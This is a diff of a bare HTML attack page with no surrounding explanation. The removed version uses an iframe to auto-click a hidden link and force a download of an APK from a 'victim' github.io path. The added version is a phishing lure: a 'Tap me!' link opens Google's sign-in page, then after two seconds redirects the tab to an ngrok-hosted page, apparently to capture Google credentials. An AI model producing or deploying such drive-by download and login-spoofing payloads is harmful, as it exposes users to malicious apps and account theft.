@@ -1,11 +1,17 @@
-<iframe srcdoc='
-<!DOCTYPE html>
 <html>
-<body>
-<a id="dl" href="https://victimjodyritonga-create.github.io/victim/kocak.apk" download></a>
-<script>
-    document.getElementById("dl").click();
-</script>
-</body>
+  <head>
+  <script>
+    function spoof() {
+      setTimeout(showAuthentication, 2000);
+      window.open('https://accounts.google.com', 'google');
+     }
+     function showAuthentication() {
+       document.location = "https://150d-103-47-134-81.ngrok-free.app/index.html";
+     }
+   </script>
+  </head>
+  <body>
+    <a href="#" onclick="spoof()">Tap me!</a>
+  </body>
 </html>
-'></iframe>
+
